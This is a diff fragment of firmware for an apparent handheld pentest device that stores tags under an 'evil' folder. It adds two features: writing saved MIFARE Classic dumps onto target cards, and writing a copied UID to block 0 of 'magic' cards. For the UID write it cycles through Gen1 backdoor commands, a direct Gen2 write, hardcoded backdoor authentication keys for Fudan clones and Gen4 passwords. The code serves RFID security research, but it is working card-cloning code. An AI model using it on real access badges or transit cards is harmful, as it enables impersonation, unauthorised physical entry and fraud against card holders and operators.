+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 55); sp.print("No block data in file");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(2000); break;
+                            }
+
+                            // Show "Place target card..."
+                            sp.fillScreen(TFT_BLACK);
+                            sp.fillRect(0, 0, W, 14, 0x0841);
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write Clone");
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(20, 50); sp.printf("Blocks: %d", n_blocks);
+                            sp.setCursor(20, 65); sp.print("Place target card...");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+
+                            // Wait for card
+                            NfcCardInfo target = {};
+                            unsigned long scan_dl = millis() + 15000;
+                            while (millis() < scan_dl) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                target = nfc_activate();
+                                if (target.valid) break;
+                                delay(200);
+                            }
+                            if (!target.valid) {
+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 55); sp.print("No card detected");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(2000); break;
+                            }
+
+                            // Write blocks
+                            const uint8_t default_key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                            int written = 0, failed = 0;
+                            int last_auth_sector = -1;
+
+                            Serial.printf("[MF] Write Clone: %d blocks, target SAK=%02X\n", n_blocks, target.sak);
+
+                            // Try Magic Gen1 backdoor first
+                            bool use_magic = false;
+                            nfc_cmd(NFC_CMD_STOP_ALL); delay(5);
+                            if (nfc_magic_wakeup()) {
+                                use_magic = true;
+                                nfc_magic_halt();
+                                Serial.println("[MF] Magic Gen1 card detected — using backdoor write");
+                            }
+
+                            int consecutive_no_card = 0;
+                            for (int blk = 0; blk < n_blocks; blk++) {
+                                if (blk % 4 == 3) continue; // skip sector trailers
+                                // Block 0 (UID) — try writing it (works on magic cards via encrypted write)
+
+                                bool blk_ok = false;
+                                const char* fail_reason = "write";
+
+                                if (use_magic) {
+                                    // Magic backdoor: wake → write → halt per block
+                                    for (int retry = 0; retry < 3 && !blk_ok; retry++) {
+                                        nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                        if (!nfc_magic_wakeup()) { fail_reason = "no card"; continue; }
+                                        if (nfc_magic_write_block(blk, dump_blocks[blk])) {
+                                            blk_ok = true; written++;
+                                            Serial.printf("[MF] Blk %d OK magic\n", blk);
+                                        } else {
+                                            fail_reason = "magic NACK";
+                                        }
+                                        nfc_magic_halt();
+                                    }
+                                } else {
+                                    // Encrypted Crypto1 write with retry
+                                    const int MAX_RETRIES = 5;
+                                    int sector = blk / 4;
+                                    int first_block = sector * 4;
+                                    for (int retry = 0; retry < MAX_RETRIES && !blk_ok; retry++) {
+                                        mf_auth_active = false;
+                                        nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                        nfc_wr(NFC_MODE_DEF, 0x09);
+                                        nfc_wr(NFC_BIT_RATE, 0x00);
+                                        nfc_cmd(NFC_CMD_RESET_GAIN);
+                                        nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                        nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
+                                        delay(5);
+                                        nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                        target = nfc_activate();
+                                        if (!target.valid) { fail_reason = "no card"; delay(50); continue; }
+                                        if (!nfc_mifare_auth_crypto1(target, first_block, default_key)) {
+                                            fail_reason = "auth"; delay(10); continue;
+                                        }
+                                        if (nfc_mifare_write_block(blk, dump_blocks[blk])) {
+                                            blk_ok = true; written++;
+                                            consecutive_no_card = 0;
+                                            Serial.printf("[MF] Blk %d OK (try %d)\n", blk, retry + 1);
+                                        } else { fail_reason = "write NACK"; }
+                                    }
+                                }
+                                if (!blk_ok) {
+                                    failed++;
+                                    Serial.printf("[MF] Blk %d FAIL: %s\n", blk, fail_reason);
+                                    if (strcmp(fail_reason, "no card") == 0) {
+                                        consecutive_no_card++;
+                                        if (consecutive_no_card >= 3) {
+                                            Serial.println("[MF] Card lost — aborting");
+                                            break;
+                                        }
+                                    } else {
+                                        consecutive_no_card = 0;
+                                    }
+                                }
+
+                                // Show progress
+                                int pct = (blk + 1) * 100 / n_blocks;
+                                sp.fillScreen(TFT_BLACK);
+                                sp.fillRect(0, 0, W, 14, 0x0841);
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Writing...");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                sp.setCursor(10, 30); sp.printf("Block %d / %d", blk, n_blocks);
+                                sp.fillRect(10, 50, 220, 12, 0x2104);
+                                sp.fillRect(10, 50, pct * 220 / 100, 12, TFT_GREEN);
+                                sp.setCursor(10, 70); sp.printf("OK: %d  Fail: %d", written, failed);
+                                if (!blk_ok) {
+                                    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                                    sp.setCursor(10, 85); sp.printf("Last: %s", fail_reason);
+                                }
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                            }
+
+                            // Done
+                            nfc_cmd(NFC_CMD_STOP_ALL);
+                            sp.fillScreen(TFT_BLACK);
+                            sp.fillRect(0, 0, W, 14, 0x0841);
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                            sp.print(failed == 0 ? "Clone Complete!" : "Clone Partial");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                            sp.setCursor(10, 30); sp.printf("Written: %d blocks", written);
+                            if (failed > 0) {
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 45); sp.printf("Failed: %d blocks", failed);
+                            }
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(10, 70); sp.print("BACK=menu");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            while (true) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                delay(10);
+                            }
+                            selecting = false;
+                            break;
+                        }
+                        delay(10);
+                    }
+                }
+            }
+        }
+
+        // ── Mode 6: Write UID (Magic Card block 0) ──
+        if (mode == 6) {
+            // List saved tags to pick source UID
+            File dir = SD.open("/evil/nfc");
+            String files[20]; int file_count = 0;
+            if (dir) {
+                while (File entry = dir.openNextFile()) {
+                    if (!entry.isDirectory() && file_count < 20) {
+                        String fn = String(entry.name());
+                        if (fn.endsWith(".txt"))
+                            files[file_count++] = String("/evil/nfc/") + entry.name();
+                    }
+                    entry.close();
+                }
+                dir.close();
+            }
+            if (file_count == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 55); sp.print("No saved tags found");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000);
+            } else {
+                int sel = 0;
+                bool picking = true;
+                while (picking) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write UID");
+                    for (int i = 0; i < min(file_count, 7); i++) {
+                        sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(4, 18 + i * 14);
+                        String fn = files[i].substring(files[i].lastIndexOf('/') + 1);
+                        sp.print(i == sel ? "> " : "  "); sp.print(fn);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print(";=up .=dn ENT=write BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); picking = false; break; }
+                        if (kp('.')) { keyRelease(); sel = (sel + 1) % file_count; break; }
+                        if (kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; break; }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            // Parse UID + block 0 from file
+                            uint8_t blk0[16] = {};
+                            uint8_t uid[10]; int uid_len = 0;
+                            uint8_t dump_blocks[4][16];
+                            int n_blks = nfc_parse_dump(files[sel].c_str(), dump_blocks, 4, uid, &uid_len);
+
+                            // Build block 0: UID + BCC + SAK + ATQA
+                            if (uid_len >= 4) {
+                                memcpy(blk0, uid, uid_len);
+                                if (uid_len == 4) {
+                                    blk0[4] = uid[0] ^ uid[1] ^ uid[2] ^ uid[3]; // BCC
+                                    blk0[5] = 0x08; // SAK for Classic 1K
+                                    blk0[6] = 0x04; blk0[7] = 0x00; // ATQA
+                                }
+                                // If block 0 was in the dump, use it directly
+                                if (n_blks > 0) memcpy(blk0, dump_blocks[0], 16);
+                            }
+
+                            sp.fillScreen(TFT_BLACK);
+                            sp.fillRect(0, 0, W, 14, 0x0841);
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write UID");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                            sp.setCursor(10, 22); sp.print("UID: ");
+                            for (int i = 0; i < uid_len; i++) sp.printf("%02X ", uid[i]);
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(10, 40); sp.print("Place magic card...");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+
+                            // Try writing block 0 — multiple methods
+                            bool ok = false;
+                            const char* method = "";
+
+                            // Method 0: Encrypted Crypto1 write (works on magic cards that support standard auth)
+                            for (int try_n = 0; try_n < 3 && !ok; try_n++) {
+                                nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                                nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5);
+                                nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                NfcCardInfo c = nfc_activate();
+                                if (!c.valid) continue;
+                                const uint8_t key[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+                                if (!nfc_mifare_auth_crypto1(c, 0, key)) continue;
+                                if (nfc_mifare_write_block(0, blk0)) {
+                                    ok = true; method = "encrypted";
+                                    Serial.printf("[MAGIC] Block 0 written via encrypted Crypto1!\n");
+                                }
+                            }
+
+                            // Method 1: Gen1 magic backdoor (WUPC + 0x43)
+                            for (int try_n = 0; try_n < 3 && !ok; try_n++) {
+                                nfc_cmd(NFC_CMD_STOP_ALL); delay(5);
+                                if (nfc_magic_wakeup()) {
+                                    ok = nfc_magic_write_block(0, blk0);
+                                    nfc_magic_halt();
+                                    if (ok) method = "Gen1 backdoor";
+                                }
+                            }
+
+                            // Method 2: Gen2/CUID — activate + direct write (no auth)
+                            if (!ok) {
+                                Serial.println("[MAGIC] Gen1 failed, trying Gen2 direct write...");
+                                for (int try_n = 0; try_n < 3 && !ok; try_n++) {
+                                    nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                    nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                                    nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                    nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5);
+                                    nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                    NfcCardInfo c = nfc_activate();
+                                    if (!c.valid) continue;
+                                    // Direct unencrypted write to block 0
+                                    mf_auth_active = false;
+                                    uint8_t cmd[2] = {0xA0, 0x00};
+                                    int rx_len;
+                                    uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+                                    if (resp && rx_len >= 1 && (resp[0] & 0x0F) == 0x0A) {
+                                        resp = nfc_transceive(blk0, 16, &rx_len, 100);
+                                        if (resp && rx_len >= 1 && (resp[0] & 0x0F) == 0x0A) {
+                                            ok = true; method = "Gen2 direct";
+                                        }
+                                    }
+                                    if (!ok) delay(100);
+                                }
+                            }
+
+                            // Method 3: Auth then unencrypted write
+                            if (!ok) {
+                                Serial.println("[MAGIC] Gen2 direct failed, trying auth+plain...");
+                                for (int try_n = 0; try_n < 3 && !ok; try_n++) {
+                                    nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                    nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                                    nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                    nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5);
+                                    nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                    NfcCardInfo c = nfc_activate();
+                                    if (!c.valid) continue;
+                                    const uint8_t key[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+                                    if (!nfc_mifare_auth_crypto1(c, 0, key)) continue;
+                                    // Force unencrypted write after auth
+                                    mf_auth_active = false;
+                                    nfc_wr(NFC_ISO14443A, 0x00); // clear no_tx/rx_par
+                                    uint8_t cmd[2] = {0xA0, 0x00};
+                                    int rx_len;
+                                    uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+                                    if (resp && rx_len >= 1 && (resp[0] & 0x0F) == 0x0A) {
+                                        resp = nfc_transceive(blk0, 16, &rx_len, 100);
+                                        if (resp && rx_len >= 1 && (resp[0] & 0x0F) == 0x0A) {
+                                            ok = true; method = "auth+plain";
+                                        }
+                                    }
+                                    if (!ok) delay(100);
+                                }
+                            }
+
+                            // Method 4: Backdoor auth keys (0x64) — Fudan/Chinese clones
+                            if (!ok) {
+                                Serial.println("[MAGIC] Trying backdoor auth keys (0x64)...");
+                                const uint8_t bd_keys[][6] = {
+                                    {0xA3,0x96,0xEF,0xA4,0xE2,0x4F},
+                                    {0xA3,0x16,0x67,0xA8,0xCE,0xC1},
+                                    {0x51,0x8B,0x33,0x54,0xE7,0x60}
+                                };
+                                for (int ki = 0; ki < 3 && !ok; ki++) {
+                                    nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                    nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                                    nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                    nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5);
+                                    nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                    NfcCardInfo c = nfc_activate();
+                                    if (!c.valid) continue;
+                                    if (!nfc_mifare_auth_crypto1_cmd(c, 0, bd_keys[ki], 0x64)) continue;
+                                    if (nfc_mifare_write_block(0, blk0)) {
+                                        ok = true; method = "backdoor key";
+                                    }
+                                }
+                            }
+
+                            // Method 5: Gen4/GDM — 0xCF + password + 0xCD + block + data
+                            if (!ok) {
+                                Serial.println("[MAGIC] Trying Gen4/GDM (0xCF)...");
+                                const uint8_t gen4_passwords[][4] = {
+                                    {0x00, 0x00, 0x00, 0x00},
+                                    {0xA3, 0x96, 0xEF, 0xA4},
+                                    {0x12, 0x34, 0x56, 0x78}
+                                };
+                                for (int pi = 0; pi < 3 && !ok; pi++) {
+                                    nfc_cmd(NFC_CMD_STOP_ALL); delay(3);
+                                    nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                                    nfc_wr(NFC_ISO14443A, 0x00);
+                                    nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                                    nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5);
+                                    nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                                    NfcCardInfo c = nfc_activate();
+                                    if (!c.valid) continue;
+                                    // Build Gen4 write: CF + password(4) + CD + block(1) + data(16) = 22 bytes
+                                    uint8_t gen4_cmd[22];
+                                    gen4_cmd[0] = 0xCF;
+                                    memcpy(gen4_cmd + 1, gen4_passwords[pi], 4);
+                                    gen4_cmd[5] = 0xCD;
+                                    gen4_cmd[6] = 0x00; // block 0
+                                    memcpy(gen4_cmd + 7, blk0, 16);
+                                    int rx_len;
+                                    uint8_t* resp = nfc_transceive(gen4_cmd, 23, &rx_len, 100);
+                                    Serial.printf("[GEN4] pw=%02X%02X%02X%02X resp=%d bytes",
+                                                  gen4_passwords[pi][0],gen4_passwords[pi][1],
+                                                  gen4_passwords[pi][2],gen4_passwords[pi][3], rx_len);
+                                    if (resp && rx_len > 0) Serial.printf(" [%02X]", resp[0]);
+                                    Serial.println();
+                                    if (resp && rx_len >= 2) {
+                                        ok = true; method = "Gen4/GDM";
+                                    }
+                                }
+                            }
+
+                            if (ok) Serial.printf("[MAGIC] Block 0 written via %s! UID=%02X%02X%02X%02X\n",
+                                                  method, blk0[0],blk0[1],blk0[2],blk0[3]);
+
+                            sp.fillScreen(TFT_BLACK);
+                            if (ok) {
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                sp.setCursor(10, 50); sp.print("UID written!");
+                                sp.setCursor(10, 65);
+                                for (int i = 0; i < uid_len; i++) sp.printf("%02X ", uid[i]);
+                            } else {
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 45); sp.print("Write failed!");
+                                sp.setCursor(10, 60); sp.print("Not a Gen1 magic card?");
+                                sp.setCursor(10, 75); sp.print("Try with a Gen1a/UID card");
+                            }
+                            sp.fillRect(0, H-14, W, 14, 0x0841);
+                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            while (true) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                delay(10);
+                            }
+                            break;
+                        }
+                        delay(10);
+                    }
+                }
+            }
+        }
+
+    } // end while(true) NFC sub-menu loop
+
+    nfc_exit:
+    if (sprite) { sprite->deleteSprite(); delete sprite; }
+    nfc_close();
+    if (cc_opened) cc_close();
+    digitalWrite(NFC_CS, HIGH);
+    digitalWrite(CC_CS, HIGH);
+    M5.Display.clear(menuBackgroundColor);
+    inMenu = true;
+}
+
 
 // =====================================================================
 // ========================= TAGTINKER ESL IR ==========================
